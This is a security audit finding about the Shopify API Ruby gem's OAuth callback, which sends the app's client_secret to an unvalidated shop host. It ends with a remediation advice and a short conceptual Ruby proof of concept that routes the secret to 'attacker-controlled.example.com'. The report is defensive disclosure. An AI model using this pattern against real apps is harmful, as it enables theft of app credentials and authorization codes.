### Title
OAuth authorization-code callback sends `client_secret` to an unvalidated `shop` host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` derives the destination host for the `client_secret`-bearing access-token request directly from `auth_query.shop`, without ever validating that this value is a trusted `*.myshopify.com`/Shopify domain. Every other credential-exchange flow in the gem (`ClientCredentials`, `RefreshToken`, `TokenExchange`) explicitly calls `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain` on the `shop` value before using it to build the request host, but `oauth.rb` omits this check.

### Finding Description
The identity binding that should hold is: **`host that is HMAC-verified == host that is validated as a genuine Shopify domain == host that receives `client_secret``**.

In `validate_auth_callback`, the HMAC check only proves the `shop`/`code`/`state`/`host`/`timestamp` tuple was produced with the app's secret — it does not prove `shop` is a `*.myshopify.com` (or other `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`) host: [1](#0-0) 

That unvalidated `auth_query.shop` is then used both to build the null session and — critically — to compute the base URI to which the app's `client_id`/`client_secret`/`code` are POSTed: [2](#0-1) [3](#0-2) 

`Clients::HttpClient` builds its base URI straight from `session.shop`, again with no domain check: [4](#0-3) 

Contrast this with the gem's other three credential-exchange call sites, which all sanitize the shop domain before it is trusted to receive `client_secret`: [5](#0-4) [6](#0-5) 

And `ShopValidator` itself, which the gem designed for exactly this purpose (restricting hosts to `shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`): [7](#0-6) 

The `AuthQuery#shop` field is a plain, unconstrained `String` — there is no format/domain constraint enforced anywhere in the `AuthQuery`/HMAC path: [8](#0-7) 

Because `begin_auth` also accepts an arbitrary `shop:` string and builds `auth_base_uri(shop)` from it without validation, the same unvalidated value flows end-to-end: whatever host string is passed in at the start of OAuth is the same host string later trusted to receive the `client_secret` at the callback, with only an HMAC integrity check in between and no "is this actually Shopify" check.

### Impact Explanation
If the `shop` value that reaches `begin_auth`/`validate_auth_callback` is not a genuine Shopify domain (e.g., a caller passes a user/attacker-influenced string, such as the `Shop` header shown in the gem's own documented usage pattern), the OAuth flow will redirect the merchant to `https://<attacker-host>/admin/oauth/authorize` and, upon callback, will POST the app's `client_id` and `client_secret` plus the authorization `code` to `https://<attacker-host>/admin/oauth/access_token`. This directly exfiltrates the app's `client_secret` (and the authorization code) to a host the gem never verified as Shopify — a Critical-impact credential theft, and inconsistent with the gem's own established pattern of validating shop domains in `ClientCredentials`, `RefreshToken`, and `TokenExchange`.

### Likelihood Explanation
This requires the host application to pass an unvalidated shop string into `begin_auth`/`validate_auth_callback` (as literally shown in the gem's own `docs/usage/oauth.md` example, which reads `shop = request.headers["Shop"]` with no `ShopValidator` call). Since the gem itself never sanitizes this value internally — unlike its sibling flows — and documents no requirement for callers to do so before calling `begin_auth`, this is a gap in the gem's own defense-in-depth for the OAuth authorization-code grant specifically, not merely "the host app ignoring documented API." However, because the top-level API's usage sample doesn't sanitize either, this remains a self-contained bug in this gem's design of the OAuth authorization code grant, distinct from the client_credentials/refresh_token/token_exchange flows that do enforce it.

### Recommendation
Add `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) calls in `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` before using `shop`/`auth_query.shop` to build `auth_base_uri` or construct the `null_session`/`HttpClient`, mirroring the pattern already used in `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`.

### Proof of Concept
Conceptual PoC (cannot be executed against the index, provided for illustration):
```ruby
# Host app (following the gem's own documented pattern) passes an
# attacker-supplied shop value straight through:
auth_response = ShopifyAPI::Auth::Oauth.begin_auth(
  shop: "attacker-controlled.example.com", # never validated by ShopifyAPI::Utils::ShopValidator
  redirect_path: "/auth/callback"
)
# => auth_response[:auth_route] == "https://attacker-controlled.example.com/admin/oauth/authorize?..."

# If, at the callback stage, ShopifyAPI::Auth::Oauth::AuthQuery.shop still carries that same
# unvalidated host and the HMAC (computed only over code/host/shop/state/timestamp) validates,
# ShopifyAPI::Auth::Oauth.validate_auth_callback will POST:
#   { client_id: ..., client_secret: Context.api_secret_key, code: ... }
# to "https://attacker-controlled.example.com/admin/oauth/access_token"
# via Clients::HttpClient, whose base URI is built directly from session.shop
# with no ShopValidator check anywhere in the path.
```

        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
